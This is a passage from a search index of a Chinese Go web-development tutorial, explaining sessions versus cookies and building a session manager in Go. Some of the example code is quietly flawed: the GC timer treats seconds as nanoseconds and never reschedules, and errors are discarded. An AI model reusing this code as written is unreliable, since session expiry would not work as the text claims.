<p>\u5f53\u7a0b\u5e8f\u9700\u8981\u4e3a\u67d0\u4e2a\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u521b\u5efa\u4e00\u4e2asession\u7684\u65f6\u5019\uff0c\u670d\u52a1\u5668\u9996\u5148\u68c0\u67e5\u8fd9\u4e2a\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u91cc\u662f\u5426\u5305\u542b\u4e86\u4e00\u4e2asession\u6807\u8bc6\uff0d\u79f0\u4e3asession id\uff0c\u5982\u679c\u5df2\u7ecf\u5305\u542b\u4e00\u4e2asession id\u5219\u8bf4\u660e\u4ee5\u524d\u5df2\u7ecf\u4e3a\u6b64\u5ba2\u6237\u521b\u5efa\u8fc7session\uff0c\u670d\u52a1\u5668\u5c31\u6309\u7167session id\u628a\u8fd9\u4e2asession\u68c0\u7d22\u51fa\u6765\u4f7f\u7528(\u5982\u679c\u68c0\u7d22\u4e0d\u5230\uff0c\u53ef\u80fd\u4f1a\u65b0\u5efa\u4e00\u4e2a\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u51fa\u73b0\u5728\u670d\u52a1\u7aef\u5df2\u7ecf\u5220\u9664\u4e86\u8be5\u7528\u6237\u5bf9\u5e94\u7684session\u5bf9\u8c61\uff0c\u4f46\u7528\u6237\u4eba\u4e3a\u5730\u5728\u8bf7\u6c42\u7684URL\u540e\u9762\u9644\u52a0\u4e0a\u4e00\u4e2aJSESSION\u7684\u53c2\u6570)\u3002\u5982\u679c\u5ba2\u6237\u8bf7\u6c42\u4e0d\u5305\u542bsession id\uff0c\u5219\u4e3a\u6b64\u5ba2\u6237\u521b\u5efa\u4e00\u4e2asession\u5e76\u4e14\u540c\u65f6\u751f\u6210\u4e00\u4e2a\u4e0e\u6b64session\u76f8\u5173\u8054\u7684session id\uff0c\u8fd9\u4e2asession id\u5c06\u5728\u672c\u6b21\u54cd\u5e94\u4e2d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u4fdd\u5b58\u3002</p> <p>session\u673a\u5236\u672c\u8eab\u5e76\u4e0d\u590d\u6742\uff0c\u7136\u800c\u5176\u5b9e\u73b0\u548c\u914d\u7f6e\u4e0a\u7684\u7075\u6d3b\u6027\u5374\u4f7f\u5f97\u5177\u4f53\u60c5\u51b5\u590d\u6742\u591a\u53d8\u3002\u8fd9\u4e5f\u8981\u6c42\u6211\u4eec\u4e0d\u80fd\u628a\u4ec5\u4ec5\u67d0\u4e00\u6b21\u7684\u7ecf\u9a8c\u6216\u8005\u67d0\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0c\u670d\u52a1\u5668\u7684\u7ecf\u9a8c\u5f53\u4f5c\u666e\u904d\u9002\u7528\u7684\u3002</p>"},{"location":"06.1/#_1","title":"\u5c0f\u7ed3","text":"<p>\u5982\u4e0a\u6587\u6240\u8ff0\uff0csession\u548ccookie\u7684\u76ee\u7684\u76f8\u540c\uff0c\u90fd\u662f\u4e3a\u4e86\u514b\u670dhttp\u534f\u8bae\u65e0\u72b6\u6001\u7684\u7f3a\u9677\uff0c\u4f46\u5b8c\u6210\u7684\u65b9\u6cd5\u4e0d\u540c\u3002session\u901a\u8fc7cookie\uff0c\u5728\u5ba2\u6237\u7aef\u4fdd\u5b58session id\uff0c\u800c\u5c06\u7528\u6237\u7684\u5176\u4ed6\u4f1a\u8bdd\u6d88\u606f\u4fdd\u5b58\u5728\u670d\u52a1\u7aef\u7684session\u5bf9\u8c61\u4e2d\uff0c\u4e0e\u6b64\u76f8\u5bf9\u7684\uff0ccookie\u9700\u8981\u5c06\u6240\u6709\u4fe1\u606f\u90fd\u4fdd\u5b58\u5728\u5ba2\u6237\u7aef\u3002\u56e0\u6b64cookie\u5b58\u5728\u7740\u4e00\u5b9a\u7684\u5b89\u5168\u9690\u60a3\uff0c\u4f8b\u5982\u672c\u5730cookie\u4e2d\u4fdd\u5b58\u7684\u7528\u6237\u540d\u5bc6\u7801\u88ab\u7834\u8bd1\uff0c\u6216cookie\u88ab\u5176\u4ed6\u7f51\u7ad9\u6536\u96c6\uff08\u4f8b\u5982\uff1a1. appA\u4e3b\u52a8\u8bbe\u7f6e\u57dfB cookie\uff0c\u8ba9\u57dfB cookie\u83b7\u53d6\uff1b2. XSS\uff0c\u5728appA\u4e0a\u901a\u8fc7javascript\u83b7\u53d6document.cookie\uff0c\u5e76\u4f20\u9012\u7ed9\u81ea\u5df1\u7684appB\uff09\u3002</p> <p>\u901a\u8fc7\u4e0a\u9762\u7684\u4e00\u4e9b\u7b80\u5355\u4ecb\u7ecd\u6211\u4eec\u4e86\u89e3\u4e86cookie\u548csession\u7684\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\uff0c\u77e5\u9053\u4ed6\u4eec\u4e4b\u95f4\u7684\u8054\u7cfb\u548c\u533a\u522b\uff0c\u505aweb\u5f00\u53d1\u4e4b\u524d\uff0c\u6709\u5fc5\u8981\u5c06\u4e00\u4e9b\u5fc5\u8981\u77e5\u8bc6\u4e86\u89e3\u6e05\u695a\uff0c\u624d\u4e0d\u4f1a\u5728\u7528\u5230\u65f6\u6349\u895f\u89c1\u8098\uff0c\u6216\u662f\u5728\u8c03bug\u65f6\u5982\u65e0\u5934\u82cd\u8747\u4e71\u8f6c\u3002\u63a5\u4e0b\u6765\u7684\u51e0\u5c0f\u8282\u6211\u4eec\u5c06\u8be6\u7ec6\u4ecb\u7ecdsession\u76f8\u5173\u7684\u77e5\u8bc6\u3002</p>"},{"location":"06.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: session\u548c\u6570\u636e\u5b58\u50a8</li> <li>\u4e0b\u4e00\u8282: Go\u5982\u4f55\u4f7f\u7528session</li> </ul>"},{"location":"06.2/","title":"6.2 Go\u5982\u4f55\u4f7f\u7528session","text":"<p>\u901a\u8fc7\u4e0a\u4e00\u5c0f\u8282\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u77e5\u9053session\u662f\u5728\u670d\u52a1\u5668\u7aef\u5b9e\u73b0\u7684\u4e00\u79cd\u7528\u6237\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u8ba4\u8bc1\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u76ee\u524dGo\u6807\u51c6\u5305\u6ca1\u6709\u4e3asession\u63d0\u4f9b\u4efb\u4f55\u652f\u6301\uff0c\u8fd9\u5c0f\u8282\u6211\u4eec\u5c06\u4f1a\u81ea\u5df1\u52a8\u624b\u6765\u5b9e\u73b0go\u7248\u672c\u7684session\u7ba1\u7406\u548c\u521b\u5efa\u3002</p>"},{"location":"06.2/#session","title":"session\u521b\u5efa\u8fc7\u7a0b","text":"<p>session\u7684\u57fa\u672c\u539f\u7406\u662f\u7531\u670d\u52a1\u5668\u4e3a\u6bcf\u4e2a\u4f1a\u8bdd\u7ef4\u62a4\u4e00\u4efd\u4fe1\u606f\u6570\u636e\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4f9d\u9760\u4e00\u4e2a\u5168\u5c40\u552f\u4e00\u7684\u6807\u8bc6\u6765\u8bbf\u95ee\u8fd9\u4efd\u6570\u636e\uff0c\u4ee5\u8fbe\u5230\u4ea4\u4e92\u7684\u76ee\u7684\u3002\u5f53\u7528\u6237\u8bbf\u95eeWeb\u5e94\u7528\u65f6\uff0c\u670d\u52a1\u7aef\u7a0b\u5e8f\u4f1a\u968f\u9700\u8981\u521b\u5efasession\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u6982\u62ec\u4e3a\u4e09\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u751f\u6210\u5168\u5c40\u552f\u4e00\u6807\u8bc6\u7b26\uff08sessionid\uff09\uff1b</li> <li>\u5f00\u8f9f\u6570\u636e\u5b58\u50a8\u7a7a\u95f4\u3002\u4e00\u822c\u4f1a\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u4e00\u65e6\u6389\u7535\uff0c\u6240\u6709\u7684\u4f1a\u8bdd\u6570\u636e\u5c31\u4f1a\u4e22\u5931\uff0c\u5982\u679c\u662f\u7535\u5b50\u5546\u52a1\u7c7b\u7f51\u7ad9\uff0c\u8fd9\u5c06\u9020\u6210\u4e25\u91cd\u7684\u540e\u679c\u3002\u6240\u4ee5\u4e3a\u4e86\u89e3\u51b3\u8fd9\u7c7b\u95ee\u9898\uff0c\u4f60\u53ef\u4ee5\u5c06\u4f1a\u8bdd\u6570\u636e\u5199\u5230\u6587\u4ef6\u91cc\u6216\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u5f53\u7136\u8fd9\u6837\u4f1a\u589e\u52a0I/O\u5f00\u9500\uff0c\u4f46\u662f\u5b83\u53ef\u4ee5\u5b9e\u73b0\u67d0\u79cd\u7a0b\u5ea6\u7684session\u6301\u4e45\u5316\uff0c\u4e5f\u66f4\u6709\u5229\u4e8esession\u7684\u5171\u4eab\uff1b</li> <li>\u5c06session\u7684\u5168\u5c40\u552f\u4e00\u6807\u793a\u7b26\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002</li> </ul> <p>\u4ee5\u4e0a\u4e09\u4e2a\u6b65\u9aa4\u4e2d\uff0c\u6700\u5173\u952e\u7684\u662f\u5982\u4f55\u53d1\u9001\u8fd9\u4e2asession\u7684\u552f\u4e00\u6807\u8bc6\u8fd9\u4e00\u6b65\u4e0a\u3002\u8003\u8651\u5230HTTP\u534f\u8bae\u7684\u5b9a\u4e49\uff0c\u6570\u636e\u65e0\u975e\u53ef\u4ee5\u653e\u5230\u8bf7\u6c42\u884c\u3001\u5934\u57df\u6216Body\u91cc\uff0c\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\u4f1a\u6709\u4e24\u79cd\u5e38\u7528\u7684\u65b9\u5f0f\uff1acookie\u548cURL\u91cd\u5199\u3002</p> <ol> <li>Cookie \u670d\u52a1\u7aef\u901a\u8fc7\u8bbe\u7f6eSet-cookie\u5934\u5c31\u53ef\u4ee5\u5c06session\u7684\u6807\u8bc6\u7b26\u4f20\u9001\u5230\u5ba2\u6237\u7aef\uff0c\u800c\u5ba2\u6237\u7aef\u6b64\u540e\u7684\u6bcf\u4e00\u6b21\u8bf7\u6c42\u90fd\u4f1a\u5e26\u4e0a\u8fd9\u4e2a\u6807\u8bc6\u7b26\uff0c\u53e6\u5916\u4e00\u822c\u5305\u542bsession\u4fe1\u606f\u7684cookie\u4f1a\u5c06\u5931\u6548\u65f6\u95f4\u8bbe\u7f6e\u4e3a0(\u4f1a\u8bddcookie)\uff0c\u5373\u6d4f\u89c8\u5668\u8fdb\u7a0b\u6709\u6548\u65f6\u95f4\u3002\u81f3\u4e8e\u6d4f\u89c8\u5668\u600e\u4e48\u5904\u7406\u8fd9\u4e2a0\uff0c\u6bcf\u4e2a\u6d4f\u89c8\u5668\u90fd\u6709\u81ea\u5df1\u7684\u65b9\u6848\uff0c\u4f46\u5dee\u522b\u90fd\u4e0d\u4f1a\u592a\u5927(\u4e00\u822c\u4f53\u73b0\u5728\u65b0\u5efa\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u65f6\u5019)\uff1b</li> <li>URL\u91cd\u5199 \u6240\u8c13URL\u91cd\u5199\uff0c\u5c31\u662f\u5728\u8fd4\u56de\u7ed9\u7528\u6237\u7684\u9875\u9762\u91cc\u7684\u6240\u6709\u7684URL\u540e\u9762\u8ffd\u52a0session\u6807\u8bc6\u7b26\uff0c\u8fd9\u6837\u7528\u6237\u5728\u6536\u5230\u54cd\u5e94\u4e4b\u540e\uff0c\u65e0\u8bba\u70b9\u51fb\u54cd\u5e94\u9875\u9762\u91cc\u7684\u54ea\u4e2a\u94fe\u63a5\u6216\u63d0\u4ea4\u8868\u5355\uff0c\u90fd\u4f1a\u81ea\u52a8\u5e26\u4e0asession\u6807\u8bc6\u7b26\uff0c\u4ece\u800c\u5c31\u5b9e\u73b0\u4e86\u4f1a\u8bdd\u7684\u4fdd\u6301\u3002\u867d\u7136\u8fd9\u79cd\u505a\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\uff0c\u5982\u679c\u5ba2\u6237\u7aef\u7981\u7528\u4e86cookie\u7684\u8bdd\uff0c\u6b64\u79cd\u65b9\u6848\u5c06\u4f1a\u662f\u9996\u9009\u3002</li> </ol>"},{"location":"06.2/#gosession","title":"Go\u5b9e\u73b0session\u7ba1\u7406","text":"<p>\u901a\u8fc7\u4e0a\u9762session\u521b\u5efa\u8fc7\u7a0b\u7684\u8bb2\u89e3\uff0c\u8bfb\u8005\u5e94\u8be5\u5bf9session\u6709\u4e86\u4e00\u4e2a\u5927\u4f53\u7684\u8ba4\u8bc6\uff0c\u4f46\u662f\u5177\u4f53\u5230\u52a8\u6001\u9875\u9762\u6280\u672f\u91cc\u9762\uff0c\u53c8\u662f\u600e\u4e48\u5b9e\u73b0session\u7684\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c06\u7ed3\u5408session\u7684\u751f\u547d\u5468\u671f\uff08lifecycle\uff09\uff0c\u6765\u5b9e\u73b0go\u8bed\u8a00\u7248\u672c\u7684session\u7ba1\u7406\u3002</p>"},{"location":"06.2/#session_1","title":"session\u7ba1\u7406\u8bbe\u8ba1","text":"<p>\u6211\u4eec\u77e5\u9053session\u7ba1\u7406\u6d89\u53ca\u5230\u5982\u4e0b\u51e0\u4e2a\u56e0\u7d20</p> <ul> <li>\u5168\u5c40session\u7ba1\u7406\u5668</li> <li>\u4fdd\u8bc1sessionid \u7684\u5168\u5c40\u552f\u4e00\u6027</li> <li>\u4e3a\u6bcf\u4e2a\u5ba2\u6237\u5173\u8054\u4e00\u4e2asession</li> <li>session \u7684\u5b58\u50a8(\u53ef\u4ee5\u5b58\u50a8\u5230\u5185\u5b58\u3001\u6587\u4ef6\u3001\u6570\u636e\u5e93\u7b49)</li> <li>session \u8fc7\u671f\u5904\u7406</li> </ul> <p>\u63a5\u4e0b\u6765\u6211\u5c06\u8bb2\u89e3\u4e00\u4e0b\u6211\u5173\u4e8esession\u7ba1\u7406\u7684\u6574\u4e2a\u8bbe\u8ba1\u601d\u8def\u4ee5\u53ca\u76f8\u5e94\u7684go\u4ee3\u7801\u793a\u4f8b\uff1a</p>"},{"location":"06.2/#session_2","title":"Session\u7ba1\u7406\u5668","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u5168\u5c40\u7684session\u7ba1\u7406\u5668 <pre><code>type Manager struct {\ncookieName  string     // private cookiename\nlock        sync.Mutex // protects session\nprovider    Provider\nmaxLifeTime int64\n}\n\nfunc NewManager(provideName, cookieName string, maxLifeTime int64) (*Manager, error) {\nprovider, ok := provides[provideName]\nif !ok {\nreturn nil, fmt.Errorf(\"session: unknown provide %q (forgotten import?)\", provideName)\n}\nreturn &amp;Manager{provider: provider, cookieName: cookieName, maxLifeTime: maxLifeTime}, nil\n}\n</code></pre> Go\u5b9e\u73b0\u6574\u4e2a\u7684\u6d41\u7a0b\u5e94\u8be5\u4e5f\u662f\u8fd9\u6837\u7684\uff0c\u5728main\u5305\u4e2d\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u7684session\u7ba1\u7406\u5668 <pre><code>var globalSessions *session.Manager\n//\u7136\u540e\u5728init\u51fd\u6570\u4e2d\u521d\u59cb\u5316\nfunc init() {\nglobalSessions, _ = NewManager(\"memory\", \"gosessionid\", 3600)\n}\n</code></pre> \u6211\u4eec\u77e5\u9053session\u662f\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u5b83\u53ef\u4ee5\u4ee5\u4efb\u4f55\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u6bd4\u5982\u5b58\u50a8\u5728\u5185\u5b58\u3001\u6570\u636e\u5e93\u6216\u8005\u6587\u4ef6\u4e2d\u3002\u56e0\u6b64\u6211\u4eec\u62bd\u8c61\u51fa\u4e00\u4e2aProvider\u63a5\u53e3\uff0c\u7528\u4ee5\u8868\u5f81session\u7ba1\u7406\u5668\u5e95\u5c42\u5b58\u50a8\u7ed3\u6784\u3002 <pre><code>type Provider interface {\nSessionInit(sid string) (Session, error)\nSessionRead(sid string) (Session, error)\nSessionDestroy(sid string) error\nSessionGC(maxLifeTime int64)\n}\n</code></pre> - SessionInit\u51fd\u6570\u5b9e\u73b0Session\u7684\u521d\u59cb\u5316\uff0c\u64cd\u4f5c\u6210\u529f\u5219\u8fd4\u56de\u6b64\u65b0\u7684Session\u53d8\u91cf - SessionRead\u51fd\u6570\u8fd4\u56desid\u6240\u4ee3\u8868\u7684Session\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u90a3\u4e48\u5c06\u4ee5sid\u4e3a\u53c2\u6570\u8c03\u7528SessionInit\u51fd\u6570\u521b\u5efa\u5e76\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684Session\u53d8\u91cf - SessionDestroy\u51fd\u6570\u7528\u6765\u9500\u6bc1sid\u5bf9\u5e94\u7684Session\u53d8\u91cf - SessionGC\u6839\u636emaxLifeTime\u6765\u5220\u9664\u8fc7\u671f\u7684\u6570\u636e</p> <p>\u90a3\u4e48Session\u63a5\u53e3\u9700\u8981\u5b9e\u73b0\u4ec0\u4e48\u6837\u7684\u529f\u80fd\u5462\uff1f\u6709\u8fc7Web\u5f00\u53d1\u7ecf\u9a8c\u7684\u8bfb\u8005\u77e5\u9053\uff0c\u5bf9Session\u7684\u5904\u7406\u57fa\u672c\u5c31 \u8bbe\u7f6e\u503c\u3001\u8bfb\u53d6\u503c\u3001\u5220\u9664\u503c\u4ee5\u53ca\u83b7\u53d6\u5f53\u524dsessionID\u8fd9\u56db\u4e2a\u64cd\u4f5c\uff0c\u6240\u4ee5\u6211\u4eec\u7684Session\u63a5\u53e3\u4e5f\u5c31\u5b9e\u73b0\u8fd9\u56db\u4e2a\u64cd\u4f5c\u3002 <pre><code>type Session interface {\nSet(key, value interface{}) error // set session value\nGet(key interface{}) interface{}  // get session value\nDelete(key interface{}) error     // delete session value\nSessionID() string                // back current sessionID\n}\n</code></pre></p> <p>\u4ee5\u4e0a\u8bbe\u8ba1\u601d\u8def\u6765\u6e90\u4e8edatabase/sql/driver\uff0c\u5148\u5b9a\u4e49\u597d\u63a5\u53e3\uff0c\u7136\u540e\u5177\u4f53\u7684\u5b58\u50a8session\u7684\u7ed3\u6784\u5b9e\u73b0\u76f8\u5e94\u7684\u63a5\u53e3\u5e76\u6ce8\u518c\u540e\uff0c\u76f8\u5e94\u529f\u80fd\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\uff0c\u4ee5\u4e0b\u662f\u7528\u6765\u968f\u9700\u6ce8\u518c\u5b58\u50a8session\u7684\u7ed3\u6784\u7684Register\u51fd\u6570\u7684\u5b9e\u73b0\u3002</p> <pre><code>var provides = make(map[string]Provider)\n\n// Register makes a session provide available by the provided name.\n// If Register is called twice with the same name or if driver is nil,\n// it panics.\nfunc Register(name string, provider Provider) {\nif provider == nil {\npanic(\"session: Register provider is nil\")\n}\nif _, dup := provides[name]; dup {\npanic(\"session: Register called twice for provider \" + name)\n}\nprovides[name] = provider\n}\n</code></pre>"},{"location":"06.2/#session-id","title":"\u5168\u5c40\u552f\u4e00\u7684Session ID","text":"<p>Session ID\u662f\u7528\u6765\u8bc6\u522b\u8bbf\u95eeWeb\u5e94\u7528\u7684\u6bcf\u4e00\u4e2a\u7528\u6237\uff0c\u56e0\u6b64\u5fc5\u987b\u4fdd\u8bc1\u5b83\u662f\u5168\u5c40\u552f\u4e00\u7684\uff08GUID\uff09\uff0c\u4e0b\u9762\u4ee3\u7801\u5c55\u793a\u4e86\u5982\u4f55\u6ee1\u8db3\u8fd9\u4e00\u9700\u6c42\uff1a</p> <pre><code>func (manager *Manager) sessionId() string {\nb := make([]byte, 32)\nif _, err := rand.Read(b); err != nil {\nreturn \"\"\n}\nreturn base64.URLEncoding.EncodeToString(b)\n}\n</code></pre>"},{"location":"06.2/#session_3","title":"session\u521b\u5efa","text":"<p>\u6211\u4eec\u9700\u8981\u4e3a\u6bcf\u4e2a\u6765\u8bbf\u7528\u6237\u5206\u914d\u6216\u83b7\u53d6\u4e0e\u4ed6\u76f8\u5173\u8fde\u7684Session\uff0c\u4ee5\u4fbf\u540e\u9762\u6839\u636eSession\u4fe1\u606f\u6765\u9a8c\u8bc1\u64cd\u4f5c\u3002SessionStart\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u7528\u6765\u68c0\u6d4b\u662f\u5426\u5df2\u7ecf\u6709\u67d0\u4e2aSession\u4e0e\u5f53\u524d\u6765\u8bbf\u7528\u6237\u53d1\u751f\u4e86\u5173\u8054\uff0c\u5982\u679c\u6ca1\u6709\u5219\u521b\u5efa\u4e4b\u3002 <pre><code>func (manager *Manager) SessionStart(w http.ResponseWriter, r *http.Request) (session Session) {\nmanager.lock.Lock()\ndefer manager.lock.Unlock()\ncookie, err := r.Cookie(manager.cookieName)\nif err != nil || cookie.Value == \"\" {\nsid := manager.sessionId()\nsession, _ = manager.provider.SessionInit(sid)\ncookie := http.Cookie{Name: manager.cookieName, Value: url.QueryEscape(sid), Path: \"/\", HttpOnly: true, MaxAge: int(manager.maxLifeTime)}\nhttp.SetCookie(w, &amp;cookie)\n} else {\nsid, _ := url.QueryUnescape(cookie.Value)\nsession, _ = manager.provider.SessionRead(sid)\n}\nreturn\n}\n</code></pre> \u6211\u4eec\u7528\u524d\u9762login\u64cd\u4f5c\u6765\u6f14\u793asession\u7684\u8fd0\u7528\uff1a <pre><code>func login(w http.ResponseWriter, r *http.Request) {\nsess := globalSessions.SessionStart(w, r)\nr.ParseForm()\nif r.Method == \"GET\" {\nt, _ := template.ParseFiles(\"login.gtpl\")\nw.Header().Set(\"Content-Type\", \"text/html\")\nt.Execute(w, sess.Get(\"username\"))\n} else {\nsess.Set(\"username\", r.Form[\"username\"])\nhttp.Redirect(w, r, \"/\", 302)\n}\n}\n</code></pre></p>"},{"location":"06.2/#_1","title":"\u64cd\u4f5c\u503c\uff1a\u8bbe\u7f6e\u3001\u8bfb\u53d6\u548c\u5220\u9664","text":"<p>SessionStart\u51fd\u6570\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u6ee1\u8db3Session\u63a5\u53e3\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u7528\u4ed6\u6765\u5bf9session\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u5462\uff1f</p> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u7684\u4ee3\u7801<code>session.Get(\"uid\")</code>\u5df2\u7ecf\u5c55\u793a\u4e86\u57fa\u672c\u7684\u8bfb\u53d6\u6570\u636e\u7684\u64cd\u4f5c\uff0c\u73b0\u5728\u6211\u4eec\u518d\u6765\u770b\u4e00\u4e0b\u8be6\u7ec6\u7684\u64cd\u4f5c: <pre><code>func count(w http.ResponseWriter, r *http.Request) {\nsess := globalSessions.SessionStart(w, r)\ncreatetime := sess.Get(\"createtime\")\nif createtime == nil {\nsess.Set(\"createtime\", time.Now().Unix())\n} else if (createtime.(int64) + 360) &lt; (time.Now().Unix()) {\nglobalSessions.SessionDestroy(w, r)\nsess = globalSessions.SessionStart(w, r)\n}\nct := sess.Get(\"countnum\")\nif ct == nil {\nsess.Set(\"countnum\", 1)\n} else {\nsess.Set(\"countnum\", (ct.(int) + 1))\n}\nt, _ := template.ParseFiles(\"count.gtpl\")\nw.Header().Set(\"Content-Type\", \"text/html\")\nt.Execute(w, sess.Get(\"countnum\"))\n}\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u5230\uff0cSession\u7684\u64cd\u4f5c\u548c\u64cd\u4f5ckey/value\u6570\u636e\u5e93\u7c7b\u4f3c:Set\u3001Get\u3001Delete\u7b49\u64cd\u4f5c</p> <p>\u56e0\u4e3aSession\u6709\u8fc7\u671f\u7684\u6982\u5ff5\uff0c\u6240\u4ee5\u6211\u4eec\u5b9a\u4e49\u4e86GC\u64cd\u4f5c\uff0c\u5f53\u8bbf\u95ee\u8fc7\u671f\u65f6\u95f4\u6ee1\u8db3GC\u7684\u89e6\u53d1\u6761\u4ef6\u540e\u5c06\u4f1a\u5f15\u8d77GC\uff0c\u4f46\u662f\u5f53\u6211\u4eec\u8fdb\u884c\u4e86\u4efb\u610f\u4e00\u4e2asession\u64cd\u4f5c\uff0c\u90fd\u4f1a\u5bf9Session\u5b9e\u4f53\u8fdb\u884c\u66f4\u65b0\uff0c\u90fd\u4f1a\u89e6\u53d1\u5bf9\u6700\u540e\u8bbf\u95ee\u65f6\u95f4\u7684\u4fee\u6539\uff0c\u8fd9\u6837\u5f53GC\u7684\u65f6\u5019\u5c31\u4e0d\u4f1a\u8bef\u5220\u9664\u8fd8\u5728\u4f7f\u7528\u7684Session\u5b9e\u4f53\u3002</p>"},{"location":"06.2/#session_4","title":"session\u91cd\u7f6e","text":"<p>\u6211\u4eec\u77e5\u9053\uff0cWeb\u5e94\u7528\u4e2d\u6709\u7528\u6237\u9000\u51fa\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u90a3\u4e48\u5f53\u7528\u6237\u9000\u51fa\u5e94\u7528\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u8be5\u7528\u6237\u7684session\u6570\u636e\u8fdb\u884c\u9500\u6bc1\u64cd\u4f5c\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5df2\u7ecf\u6f14\u793a\u4e86\u5982\u4f55\u4f7f\u7528session\u91cd\u7f6e\u64cd\u4f5c\uff0c\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u5c31\u662f\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u529f\u80fd\uff1a <pre><code>//Destroy sessionid\nfunc (manager *Manager) SessionDestroy(w http.ResponseWriter, r *http.Request){\ncookie, err := r.Cookie(manager.cookieName)\nif err != nil || cookie.Value == \"\" {\nreturn\n} else {\nmanager.lock.Lock()\ndefer manager.lock.Unlock()\nmanager.provider.SessionDestroy(cookie.Value)\nexpiration := time.Now()\ncookie := http.Cookie{Name: manager.cookieName, Path: \"/\", HttpOnly: true, Expires: expiration, MaxAge: -1}\nhttp.SetCookie(w, &amp;cookie)\n}\n}\n</code></pre></p>"},{"location":"06.2/#session_5","title":"session\u9500\u6bc1","text":"<p>\u6211\u4eec\u6765\u770b\u4e00\u4e0bSession\u7ba1\u7406\u5668\u5982\u4f55\u6765\u7ba1\u7406\u9500\u6bc1\uff0c\u53ea\u8981\u6211\u4eec\u5728Main\u542f\u52a8\u7684\u65f6\u5019\u542f\u52a8\uff1a <pre><code>func init() {\ngo globalSessions.GC()\n}\n</code></pre></p> <p><pre><code>func (manager *Manager) GC() {\nmanager.lock.Lock()\ndefer manager.lock.Unlock()\ntime.AfterFunc(time.Duration(manager.maxLifeTime), func() { manager.provider.SessionGC(manager.maxLifeTime) })\n}\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230GC\u5145\u5206\u5229\u7528\u4e86time\u5305\u4e2d\u7684\u5b9a\u65f6\u5668\u529f\u80fd\uff0c\u5f53\u8d85\u65f6<code>maxLifeTime</code>\u4e4b\u540e\u8c03\u7528GC\u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4fdd\u8bc1<code>maxLifeTime</code>\u65f6\u95f4\u5185\u7684session\u90fd\u662f\u53ef\u7528\u7684\uff0c\u7c7b\u4f3c\u7684\u65b9\u6848\u4e5f\u53ef\u4ee5\u7528\u4e8e\u7edf\u8ba1\u5728\u7ebf\u7528\u6237\u6570\u4e4b\u7c7b\u7684\u3002</p>"},{"location":"06.2/#_2","title":"\u603b\u7ed3","text":"<p>\u81f3\u6b64 \u6211\u4eec\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7528\u6765\u5728Web\u5e94\u7528\u4e2d\u5168\u5c40\u7ba1\u7406Session\u7684SessionManager\uff0c\u5b9a\u4e49\u4e86\u7528\u6765\u63d0\u4f9bSession\u5b58\u50a8\u5b9e\u73b0Provider\u7684\u63a5\u53e3\uff0c\u4e0b\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u5c06\u4f1a\u901a\u8fc7\u63a5\u53e3\u5b9a\u4e49\u6765\u5b9e\u73b0\u4e00\u4e9bProvider,\u4f9b\u5927\u5bb6\u53c2\u8003\u5b66\u4e60\u3002</p>"},{"location":"06.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: session\u548ccookie</li> <li>\u4e0b\u4e00\u8282: session\u5b58\u50a8</li> </ul>"},{"location":"06.3/","title":"6.3 